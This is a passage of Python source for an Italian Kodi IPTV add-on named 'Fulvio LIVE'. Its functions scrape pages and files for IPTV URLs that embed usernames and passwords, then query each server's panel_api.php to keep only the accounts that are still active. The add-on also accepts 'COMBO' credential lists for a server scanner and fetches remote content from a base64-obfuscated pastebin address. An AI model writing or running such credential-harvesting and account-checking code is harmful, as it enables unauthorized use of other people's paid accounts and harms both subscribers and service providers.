            addDir('[B][COLOR orange]Player esterno [COLOR white]android[/COLOR] '+name+'[/COLOR][/B]','playcore',mode,os.path.join(home, 'icon.png'),FANART,'','','','','list')

            addDir('[B][COLOR orange]IMPOSTAZIONI[/COLOR][/B]','url',115,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            addDir('[B][COLOR orange]Cancella CACHE[/COLOR][/B]','url',116,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            addDir('[B][COLOR fuchsia]Server Scanner[/COLOR][/B]','url',589,os.path.join(home, 'icon.png'),FANART,'','','','',True)
        except: traceback.print_exc()

def Getkeyboardtext(title = '', defaultText = ''):
    keyboard = xbmc.Keyboard(defaultText, title)
    keyboard.doModal()
    text = keyboard.getText()
    if keyboard.isConfirmed() and text != '':
        return text

def Getdialogselect(heading,list):
    dialog = xbmcgui.Dialog()
    result = dialog.select(heading, list)
    return result

def Getdialogbrowse(type,heading,shares,mask):
    dialog = xbmcgui.Dialog()
    result = dialog.browse(type, heading, shares, mask)
    return result

def addSource(url=None):
        namesource = 'source_list'
        select = Getdialogselect('Seleziona il source',['[COLOR gold]XML o M3U : File locale[/COLOR]','[COLOR cyan]XML o M3U : Link remoto[/COLOR]','[COLOR orange]SCAN M3U : URL Page[/COLOR]','[COLOR orange]SCAN M3U : Local File[/COLOR]'])
        if select == -1:
            return
        if select == 0:
            source_url = Getdialogbrowse(1,'XML o M3U : Seleziona File','myprograms','.xml|.txt|.m3u8|.m3u')
        if select == 1:
            source_url = Getkeyboardtext('XML o M3U : Inserisci URL', '').strip()
        if select == 2:
            source_url = Getkeyboardtext('SCAN M3U : Inserisci URL', '').strip()
            namesource = 'source_list2'
        if select == 3:
            source_url = Getdialogbrowse(1,'SCAN M3U : Seleziona File','myprograms','.xml|.txt|.m3u8|.m3u')
            namesource = 'source_list2'
        # if url is None:
            # if not addon.getSetting("new_file_source") == "":
               # source_url = addon.getSetting('new_file_source').decode('utf-8')
            # elif not addon.getSetting("new_url_source") == "":
               # source_url = addon.getSetting('new_url_source').decode('utf-8')
        # else:
            # source_url = url
        if source_url == '' or source_url is None:
            return
        if re.search(r'http.+?\/(?:live|movie)\/.+?\/.+?\/\d+\.(?:ts|m3u8|mkv|mp4|avi)', source_url):
            ch = re.search("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",source_url)
            list = 'http://'+ch.group(1)+'/get.php?username='+ch.group(2)+'&password='+ch.group(3)+'&type=m3u'
            source_url = list

        media_info = None
        #print 'source_url',source_url
        # data = getSoup(source_url)
                
        # if isinstance(data,BeautifulSOAP):
            # if data.find('channels_info'):
                # media_info = data.channels_info
            # elif data.find('items_info'):
                # media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = base64.b64encode(source_url)
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            # if '/' in source_url:
                # nameStr = source_url.split('/')[-1].split('.')[0]
            # if '\\' in source_url:
                # nameStr = source_url.split('\\')[-1].split('.')[0]
            # if '%' in nameStr:
                # nameStr = urllib.unquote_plus(nameStr)
            keyboard = xbmc.Keyboard(source_url,'Inserisci il nome')
            keyboard.doModal()
            if (keyboard.isConfirmed() == False):
                return
            newStr = keyboard.getText()
            if len(newStr) == 0:
                return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = base64.b64encode(source_url)
            source_media['fanart'] = fanart
        source_list = os.path.join(profile, namesource)
        if os.path.exists(source_list)==False:
            source_list = []
            source_list.append(source_media)
            b = open(source_list,"w")
            b.write(json.dumps(source_list))
            b.close()
        else:
            sources = json.loads(open(source_list,"r").read())
            sources.append(source_media)
            b = open(source_list,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,New source added.,5000,"+icon+")")
        # if not url is None:
            # if 'xbmcplus.xb.funpic.de' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            # elif 'community-links' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        # else: addon.openSettings()
        xbmc.executebuiltin("XBMC.Container.Refresh")

def addSource_serverscanhost(url=None):
        namesource = 'source_list3'
        select = Getdialogselect('Seleziona il source',['[COLOR gold]Inserisci Server HOST[/COLOR]','[COLOR cyan]Seleziona COMBO[/COLOR]'])
        if select == -1:
            return
        if select == 0:
            source_url = Getkeyboardtext('Inserisci Server HOST', '').strip()
        if select == 1:
            source_url = Getdialogbrowse(1,'Seleziona COMBO','myprograms','.txt')
            namesource = 'source_list4'

        if source_url == '' or source_url is None:
            return
        if re.search(r'(?:http://)*([^/]+)(?:/)*', source_url):
            ch = re.search(r'(?:http://)*([^/]+)(?:/)*',source_url)
            source_url = ch.group(1)

        media_info = None
        #print 'source_url',source_url
        # data = getSoup(source_url)
                
        # if isinstance(data,BeautifulSOAP):
            # if data.find('channels_info'):
                # media_info = data.channels_info
            # elif data.find('items_info'):
                # media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = base64.b64encode(source_url)
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            # if '/' in source_url:
                # nameStr = source_url.split('/')[-1].split('.')[0]
            # if '\\' in source_url:
                # nameStr = source_url.split('\\')[-1].split('.')[0]
            # if '%' in nameStr:
                # nameStr = urllib.unquote_plus(nameStr)
            # keyboard = xbmc.Keyboard(source_url,'Inserisci il nome')
            # keyboard.doModal()
            # if (keyboard.isConfirmed() == False):
                # return
            newStr = source_url #keyboard.getText()
            if len(newStr) == 0:
                return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = base64.b64encode(source_url)
            source_media['fanart'] = fanart
        source_list = os.path.join(profile, namesource)
        if os.path.exists(source_list)==False:
            source_list = []
            source_list.append(source_media)
            b = open(source_list,"w")
            b.write(json.dumps(source_list))
            b.close()
        else:
            sources = json.loads(open(source_list,"r").read())
            sources.append(source_media)
            b = open(source_list,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,New source added.,5000,"+icon+")")
        # if not url is None:
            # if 'xbmcplus.xb.funpic.de' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            # elif 'community-links' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        # else: addon.openSettings()
        xbmc.executebuiltin("XBMC.Container.Refresh")

def rmSource(url):
        sources = json.loads(open(source_list,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['url'] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def rmM3us(url):
        sources = json.loads(open(source_list2,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list2,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['url'] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list2,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def rm_serverscanhost(url):
        sources = json.loads(open(source_list3,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list3,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['url'] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list3,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def rm_serverscancombo(url):
        sources = json.loads(open(source_list4,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list4,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['url'] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_list4,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def getList():
    try:
        addDir('[B][COLOR lawngreen]RISORSE PERSONALI [/COLOR][/B]','url',500,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR lightblue]Aggiungi [COLOR lawngreen]XML[/COLOR] o [COLOR lawngreen]M3U[/COLOR] o [COLOR orange]SCAN m3u[/COLOR][/COLOR][/B]','url',7,os.path.join(home, 'icon.png'),FANART,'','','','',True)
        addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [/B]','url',70,os.path.join(home, 'icon.png'),FANART,'','','','',True)

        if os.path.exists(source_list2)==True:
            sources = json.loads(open(source_list2,"r").read())
            if len(sources) >= 1:
                c = 0
                for i in sources:
                    c += 1
                    try:
                        thumb = icon
                        fanart = FANART
                        desc = ''
                        date = ''
                        credits = ''
                        genre = ''
                        if i.has_key('thumbnail'):
                            thumb = i['thumbnail']
                        if i.has_key('fanart'):
                            fanart = i['fanart']
                        if i.has_key('description'):
                            desc = i['description']
                        if i.has_key('date'):
                            date = i['date']
                        if i.has_key('genre'):
                            genre = i['genre']
                        if i.has_key('credits'):
                            credits = i['credits']
                        addDir('[COLOR yellow]'+str(c)+'[/COLOR] | [COLOR orange]'+i['title']+'[/COLOR]',base64.b64decode(i['url']).encode('utf-8'),554,thumb,fanart,desc,genre,date,credits,'list2')
                    except: traceback.print_exc()

        addLink('','[B] [COLOR yellow] [/COLOR] [/B]','','','','','',True,None,'',10)

        if os.path.exists(source_list)==True:
            sources = json.loads(open(source_list,"r").read())
            #print 'sources',sources
            if len(sources) >= 1:
                c = 0
                for i in sources:
                    c += 1
                    try:
                        ## for pre 1.0.8 sources
                        if isinstance(i, list):
                            addDir(i[0].encode('utf-8'),base64.b64decode(i[1]).encode('utf-8'),1,icon,FANART,'','','','','list')
                        else:
                            thumb = icon
                            fanart = FANART
                            desc = ''
                            date = ''
                            credits = ''
                            genre = ''
                            if i.has_key('thumbnail'):
                                thumb = i['thumbnail']
                            if i.has_key('fanart'):
                                fanart = i['fanart']
                            if i.has_key('description'):
                                desc = i['description']
                            if i.has_key('date'):
                                date = i['date']
                            if i.has_key('genre'):
                                genre = i['genre']
                            if i.has_key('credits'):
                                credits = i['credits']
                            addDir('[COLOR yellow]'+str(c)+'[/COLOR] | [COLOR lightcyan]'+i['title']+'[/COLOR]',base64.b64decode(i['url']).encode('utf-8'),1,thumb,fanart,desc,genre,date,credits,'listpvr')
                    except: traceback.print_exc()

    except: traceback.print_exc()

def init_al():
    try:
        pass
    except:
        pass

def searchSource():
    from itertools import islice
    quante = int(numeric('Fulvio LIVE: Numero di liste in cui cercare', ''))
    start = int(numeric('Fulvio LIVE: Posizione da cui partire la ricerca', ''))
    limit = quante + start

    from xml.sax.saxutils import escape, unescape
    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')

    match = []
    if os.path.exists(source_list)==True:
        sources = json.loads(open(source_list,"r").read())
        if len(sources) >= 1:
            for i in sources:
                match.append(base64.b64decode(i['url']))

    count = 0
    for item in islice(match, start, limit):
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for list in islice(match, start, limit):
        list = unescape(list)
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
        url1 = list
        try:
            if url1.startswith('http://') or url1.startswith('https://'):
                html1 = makeRequest(url1)
            else:
                html1 = open(url1, 'r').read()
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for i1, name, url, i4, i5 in matches:
        c += 1
        addLink(url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def getM3us(url=None,name=None,lists=None,det=None):
    from xml.sax.saxutils import escape, unescape
    from BeautifulSoup import BeautifulStoneSoup
    import cgi

    urls = []
    if isinstance(url, basestring):
        urls.append(url)
    else:
        urls = url

    # addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [/B] '+name+'',url,mode1,os.path.join(home, 'icon.png'),FANART,'','','','',True)
    # addDir('[B] [COLOR white]   [ [COLOR yellow]Multi Check[/COLOR] - mostra solo [COLOR lime]ATTIVE[/COLOR]  ][/COLOR][/B] ',url,mode2,os.path.join(home, 'icon.png'),FANART,'','','','',True)
    
    out = set()
    
    count = 0
    for item in range(len(urls)):
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'SCAN in [COLOR hotpink]'+c+'[/COLOR] risorse in corso...')
    percent = 0
    i = 0
    cc = count
    for url in urls:
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Risorse rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Risorsa in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
        matches = []

        if lists:
            matches = lists
        else:
            if url.startswith('http://') or url.startswith('https://'):
                if '$$Name=' in url:
                    a=url.split('$$Name=')[1].split('$$')[0]
                    rp='$$Name=%s$$'%a
                    url=url.replace(rp,"")
                    a=repest(a)
                    d = makeRequest(url)
                    d = gethome(d,a)
                elif '$$LSProEncKey=' in url:
                    a=url.split('$$LSProEncKey=')[1].split('$$')[0]
                    rp='$$LSProEncKey=%s$$'%a
                    url=url.replace(rp,"")
                    d = makeRequest(url)
                    d = gethome(d,a)
                elif '$$Key$$' in url:
                    a=Getkeyboardtext('Inserisci la KEY', '').strip()
                    url=url.replace("$$Key$$","")
                    d = makeRequest(url)
                    d = gethome(d,a)

                else:
                    d = makeRequest(url)
            else:
                d = open(url, 'r').read()

            matches += re.findall(r'(http://[^[/]+/get\.php\?username=[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u)', d)
            ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",d)
            for i1,i2,i3 in ch:
                list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                out.add(list)
            ch = re.findall(r"http:\\/\\/(.+?)\\/(?:live|movie)\\/(.+?)\\/(.+?)\\/.+?\.(?:ts|m3u8|mkv|mp4|avi)",d)
            for i1,i2,i3 in ch:
                list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                out.add(list)
            matches += re.findall(r'<page>(?:<\!\[CDATA\[)*(http\S+)\s*(?:\]\]>)*</page>', d)
            matches += re.findall(r'<externallink>([^<$]+).*?</externallink>', d)

        for item in matches:
            item = HTMLEntitiesToUnicode(item)

            if not item.find("get.php?username=")>0:
                matches2 = []

                try:
                    if '$$LSProEncKey=' in item:
                        a=item.split('$$LSProEncKey=')[1].split('$$')[0]
                        rp='$$LSProEncKey=%s$$'%a
                        item=item.replace(rp,"")
                        html = makeRequest(item)
                        html = gethome(html,a)
                    else:
                        html = makeRequest(item)
                    matches2 += re.findall(r'(http://[^[/]+/get\.php\?username=[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u)', html)
                    ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",html)
                    for i1,i2,i3 in ch:
                        list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                        out.add(list)
                    matches2 += re.findall(r'<page>(?:<\!\[CDATA\[)*(http\S+)\s*(?:\]\]>)*</page>', html)
                    matches2 += re.findall(r'<externallink>([^<$]+).*?</externallink>', html)
                except:
                    pass

                for item2 in matches2:
                    item2 = HTMLEntitiesToUnicode(item2)
                    if not item2.find("get.php?username=")>0:
                        try:
                            if '$$LSProEncKey=' in item2:
                                a=item2.split('$$LSProEncKey=')[1].split('$$')[0]
                                rp='$$LSProEncKey=%s$$'%a
                                item2=item2.replace(rp,"")
                                html = makeRequest(item2)
                                html = gethome(html,a)
                            else:
                                html = makeRequest(item2)
                            ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",html)
                            for i1,i2,i3 in ch:
                                list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                                out.add(list)
                        except:
                            pass
                    else:
                        out.add(item2)
                        
                if (progress.iscanceled()):
                    progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                    break
            else:
                out.add(item)
                
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break

    progress.close()

    playlist = out
    if not det:
        researc = '$$research$$ '
        multich = '$$multicheck$$'
    else:
        researc = '$$researchh$$ '
        multich = '$$multicheckh$$'
    addLink('',researc+name+'','','','','','',True,playlist,None,1)
    addLink('',multich,'','','','','',True,playlist,None,1)

    c = 0
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for i in out:
        list = re.finditer(r'http://(.{5}).+?/get\.php\?username=(.{1,3})[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', i)
        c += 1
        for r in list:
            rr = unescape(r.group())
            r1 = r.group(1)
            r2 = r.group(2)
            if not det:
                n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
            else:
                n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] [COLOR lime]'+str(c)+'[/COLOR] [/B]'
            addDir(n,rr,1,thumbnail,'','','','','','list')

def searchM3us(url=None,name=None,lists=None,det=None):
    from itertools import islice
    quante = int(numeric('Fulvio LIVE: Numero di liste in cui cercare', ''))
    start = int(numeric('Fulvio LIVE: Posizione da cui partire la ricerca', ''))
    if start > 0:
        start -= 1
    limit = quante + start

    from xml.sax.saxutils import escape, unescape
    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')

    urls = []
    if isinstance(url, basestring):
        urls.append(url)
    else:
        urls = url

    for url in urls:

        matches = []
        match = set()
        if lists:
            matches = lists
        else:
            if '$$Name=' in url:
                a=url.split('$$Name=')[1].split('$$')[0]
                rp='$$Name=%s$$'%a
                url=url.replace(rp,"")
                a=repest(a)
                d = makeRequest(url)
                d = gethome(d,a)
            elif '$$LSProEncKey=' in url:
                a=url.split('$$LSProEncKey=')[1].split('$$')[0]
                rp='$$LSProEncKey=%s$$'%a
                url=url.replace(rp,"")
                d = makeRequest(url)
                d = gethome(d,a)
            else:
                d = makeRequest(url)
            matches += re.findall(r'(http://[^[/]+/get\.php\?username=[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u)', d)
            ch = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)",d)
            for i1,i2,i3 in ch:
                list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
                matches.append(list)
            matches += re.findall(r'<page>(?:<\!\[CDATA\[)*(http\S+)\s*(?:\]\]>)*</page>', d)
            matches += re.findall(r'<externallink>([^<$]+).*?</externallink>', d)
        for m in matches:
            match.add(m)

        count = 0
        for item in islice(match, start, limit):
            count += 1
        c = str(count)
        progress = xbmcgui.DialogProgress()
        progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
        percent = 0
        i = 0
        cc = count
        matches = []
        for list in islice(match, start, limit):
            list = unescape(list)
            i += 1
            percent = min((i*100)/count, 100)
            cc -= 1
            ccc = str(cc)
            progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
            url1 = list
            try:
                html1 = makeRequest(url1)
                match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
                matches += match1
                if (progress.iscanceled()):
                    progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                    break
            except:
                pass
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        progress.close()
        thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        total = len(matches)
        c = 0
        for i1, name, url, i4, i5 in matches:
            c += 1
            if not det:
                n = '[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]'
            else:
                n = '[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]  [/B]'
            addLink(url,n,thumbnail,'','','','',True,None,'',total)
        addDir(' ','',579,'','','','','','','list')

def multicheckM3us(url=None,name=None,mlists=None,det=None):
    from xml.sax.saxutils import escape, unescape

    urls = []
    if isinstance(url, basestring):
        urls.append(url)
    else:
        urls = url

    out2 = set()
    numatt = 0
    for url in urls:

        match = set()
        if mlists:
            matches = mlists
        else:
            d = makeRequest(url)
            matches = re.findall(r'http://[^[/]+/get\.php\?username=[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', d)
        for m in matches:
            match.add(m)
        lists = match
        
        count = 0
        for list in lists:
            count += 1
        progress = xbmcgui.DialogProgress()
        progress.create('Progress', 'Ricerca in [COLOR hotpink]'+str(count)+'[/COLOR] liste in corso...   [COLOR yellow]'+str(numatt)+'[/COLOR] trovate [COLOR lime]Attive[/COLOR]')
        percent = 0
        int = 0
        cc = count
        for list in lists:
            try:
                int += 1
                percent = min((int*100)/count, 100)
                cc -= 1
                progress.update( percent, 'Ricerca in [COLOR hotpink]'+str(count)+'[/COLOR] liste in corso...   [COLOR yellow]'+str(numatt)+'[/COLOR] trovate [COLOR lime]Attive[/COLOR]', 'Rimanenti: [COLOR yellow]'+str(cc)+'[/COLOR] ', 'In corso: [COLOR lime]'+str(int)+' [/COLOR]' )
                ch = re.findall(r'http://(.+?)/get\.php\?username=([^&]+)(?:&|&amp;)password=([^&]+)(?:&|&amp;)type=m3u',list)
                for i1,i2,i3 in ch:
                    panel = 'http://'+i1+'/panel_api.php?username='+i2+'&password='+i3
                html = makeRequest2(panel)
                match = re.findall(r',"(status":".+?)","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":".+?","created_at":".+?","max_connections":".+?",', html)
                for n,i in enumerate(match):
                    if i == 'status":"Active':
                        out2.add(list)
                        numatt += 1
                if (progress.iscanceled()):
                    progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                    break
            except:
                pass
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        progress.close()

    playlist = out2
    if not det:
        researc = '$$research$$ '
        multich = '$$multicheck$$'
    else:
        researc = '$$researchh$$ '
        multich = '$$multicheckh$$'
    addLink('',multich+' [B] [COLOR white] RISULTATI :  [/COLOR][/B]','','','','','',True,playlist,None,1)
    addLink('',researc,'','','','','',True,playlist,None,1)

    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for i in out2:
        list = re.finditer(r'http://(.{5}).+?/get\.php\?username=(.{1,3})[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', i)
        c += 1
        for r in list:
            rr = unescape(r.group())
            r1 = r.group(1)
            r2 = r.group(2)
            if not det:
                n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
            else:
                n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] [COLOR lime]'+str(c)+'[/COLOR] [/B]'
            addDir(n,rr,1,thumbnail,'','','','','','list')

def getExtsource(s):
    try:
        h = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3BKd1luZExV')
        c = makeRequest(h)
        c = gethome(c,base64.decodestring('YlZjVTJQdmM2NHJZenpFZA=='))
        m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
        # h = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvaS5waHA=')
        # c = makeRequest(h)
        # m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
    except:
        h = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3BKd1luZExV')
        c = makeRequest(h)
        c = gethome(c,base64.decodestring('YlZjVTJQdmM2NHJZenpFZA=='))
        m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]

    if isinstance(s, basestring):
        if s == m:
            opt = Risest()
            try:
                addDir('[B][COLOR cyan]RISORSE ESTERNE [/COLOR][/B]','url',502,os.path.join(home, 'icon.png'),FANART,'','','','','list')
                for i1, i2, i3 in opt:
                    if i1.find("$addlink$")>0:
                        i1 = i1.replace('$$addlink$$','')
                        playlist = i3.split()
                        addLink('','$$scanon$$'+i1+'','','','','','',True,playlist,None,1)
                    else:
                        addDir(i1,i2,int(i3),os.path.join(home, 'icon.png'),FANART,'','','','','list')
            except: traceback.print_exc()
        else:
            pass
    else:
        pass

def getTvonline():
    try:
        addDir('[B][COLOR lime]TV[/COLOR] [COLOR lightblue]ONLINE[/COLOR][/B]','url',539,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white]Infogw [/COLOR][/B]','http://bit.ly/m3ubyinfogw',1,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white]Opus [/COLOR][/B]','http://opus.re',540,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white]Pandasat [/COLOR][/B]','http://www.pandasat.info/iptv/kodi',1,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white]RSI channels [/COLOR][/B]','u',557,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white]Cloud TV stream (SportsDevil)[/COLOR][/B]','cloudtv',523,os.path.join(home, 'icon.png'),FANART,'','','','','list')
        addDir('[B][COLOR white][/COLOR][/B]','url',608,os.path.join(home, 'icon.png'),FANART,'','','','','list')
    except: traceback.print_exc()

def getServerscan():
    addDir('[B][COLOR fuchsia]Server Scanner [/COLOR][/B]','url',589,os.path.join(home, 'icon.png'),FANART,'','','','','list')
    try:
        addDir('[B][COLOR lightblue]Aggiungi [COLOR lawngreen]Server HOST[/COLOR] e [COLOR lawngreen]COMBO File[/COLOR] [/COLOR][/B]','url',590,os.path.join(home, 'icon.png'),FANART,'','','','',True)
        addDir('[B] [COLOR white]Imposta il download path nelle Impostazioni / Varie[/COLOR]   [/B]','url',115,os.path.join(home, 'icon.png'),FANART,'','','','',True)

        if os.path.exists(source_list3)==True:
            sources = json.loads(open(source_list3,"r").read())
            if len(sources) >= 1:
                c = 0
                for i in sources:
                    c += 1
                    try:
                        thumb = icon
                        fanart = FANART
                        desc = ''
                        date = ''
                        credits = ''
                        genre = ''
                        if i.has_key('thumbnail'):
                            thumb = i['thumbnail']
